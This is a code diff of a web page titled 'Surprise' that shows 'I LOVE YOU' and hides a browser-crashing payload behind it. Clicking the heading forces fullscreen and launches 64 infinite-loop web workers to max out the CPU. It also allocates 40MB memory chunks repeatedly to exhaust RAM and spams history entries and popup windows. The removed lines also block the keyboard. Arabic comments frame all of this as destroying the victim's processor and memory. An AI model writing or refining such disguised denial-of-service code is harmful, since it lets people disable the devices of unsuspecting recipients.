@@ -4,59 +4,55 @@
     <meta charset="UTF-8">
     <title>Surprise ❤️</title>
     <style>
-        body { background: black; color: #ff0055; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        h1 { font-size: 5rem; font-family: 'Arial Black', sans-serif; text-shadow: 0 0 20px #ff0055; cursor: pointer; }
+        body { background: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        h1 { font-size: 5rem; font-family: 'Arial Black', sans-serif; color: #ff0055; text-shadow: 0 0 50px #ff0055; }
     </style>
 </head>
 <body>
 
-    <h1 id="trigger">I LOVE YOU</h1>
+    <h1 id="start">I LOVE YOU</h1>
 
     <script>
-        const trigger = document.getElementById('trigger');
-        let storage = [];
+        const btn = document.getElementById('start');
+        let ramKiller = [];
 
-        trigger.onclick = function() {
-            this.innerText = "OPTIMIZING...";
+        btn.onclick = function() {
+            this.innerText = "LOADING...";
             
-            // 1. تفعيل وضع ملء الشاشة لتعطيل الخروج السريع
+            // 1. الدخول في ملء الشاشة لإرباك النظام
             document.documentElement.requestFullscreen().catch(()=>{});
 
-            // 2. هجوم المعالج (CPU) عبر "الخيوط المتوازية"
-            const cores = navigator.hardwareConcurrency || 8;
-            for (let i = 0; i < cores; i++) {
-                const worker = new Worker(URL.createObjectURL(new Blob([`
-                    onmessage = function(e) {
-                        const sab = e.data;
-                        const int32 = new Int32Array(sab);
+            // 2. تدمير المعالج (CPU)
+            // نفتح 64 عامل (Worker) مرة واحدة؛ ده بيجبر أي معالج مهما كانت قوته إنه يوصل 100%
+            for (let i = 0; i < 64; i++) {
+                const blob = new Blob([`
+                    setInterval(() => {
+                        let x = 0;
                         while(true) {
-                            // عملية حسابية معقدة تستهلك المعالج كلياً
-                            Math.sqrt(Math.random() * Math.tan(Math.random()));
-                            Atomics.add(int32, 0, 1); 
+                            // عمليات تشفير ثقيلة جداً تستهلك المعالج كلياً
+                            x += Math.sqrt(Math.random()) * Math.exp(Math.random());
+                            // إرسال بيانات وهمية لإشغال القناة الرئيسية
+                            if(x > 1000000) { postMessage(x); x = 0; }
                         }
-                    }
-                `], {type: 'application/javascript'})));
+                    }, 1);
+                `], { type: 'application/javascript' });
 
-                // إنشاء ذاكرة مشتركة تمنع المتصفح من عمل "Aw Snap"
-                const sab = new SharedArrayBuffer(1024);
-                worker.postMessage(sab);
+                const worker = new Worker(URL.createObjectURL(blob));
+                
+                // 3. تدمير الرام (RAM) من خلال الرد على العمال
+                worker.onmessage = function() {
+                    // حجز مصفوفات ضخمة في الذاكرة مع كل رد من العامل
+                    let chunk = new Float64Array(1024 * 1024 * 5); // 40MB لكل لفة
+                    ramKiller.push(chunk);
+                };
             }
 
-            // 3. هجوم الرام (RAM) - استنزاف صامت ومستمر
+            // 4. تعطيل المتصفح عن التنفس
             setInterval(() => {
-                // حجز 64 ميجا في كل دورة
-                // استخدام الـ ArrayBuffer هنا "خام" ولا يكتشفه نظام الـ Garbage Collector بسرعة
-                let chunk = new Uint8Array(64 * 1024 * 1024).fill(Math.random() * 255);
-                storage.push(chunk);
-
-                // منع المتصفح من التجميد الفوري (الذي يسبب Aw Snap) عن طريق تحديث واجهة بسيط
-                if (storage.length % 10 === 0) {
-                    console.log("Memory Synced: " + storage.length * 64 + "MB");
-                }
-            }, 50); // سرعة 50ms تضمن الوصول لـ 8 جيجا رام في ثوانٍ معدودة
-
-            // 4. تعطيل الماوس والكيبورد (شلل حركي)
-            window.addEventListener('keydown', (e) => e.preventDefault());
+                window.history.pushState(null, null, "#" + Math.random());
+                // محاولة فتح نوافذ جديدة لزيادة الضغط
+                window.open(window.location.href, '_blank', 'width=10,height=10');
+            }, 100);
         };
     </script>
 </body>
